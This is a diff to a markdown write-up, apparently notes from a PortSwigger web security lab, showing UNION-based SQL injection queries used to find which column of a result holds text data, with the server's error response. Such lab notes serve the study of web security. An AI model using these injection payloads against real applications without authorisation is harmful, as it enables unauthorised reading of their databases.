@@ -24,7 +24,7 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL--
 **1st column**
 
 ```sql
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'A',NULL --
+SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'd',NULL --
 ```
 
 Internal Server Error
@@ -34,10 +34,11 @@ Internal Server Error
 
 **2nd Column**
 
-This column contains text data 
-
 ```sql
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'A' --
+SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'d' --
 ```
+This column contains text data .
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d41987fb-4556-4e51-b0d4-4169caa0de96)
 
 
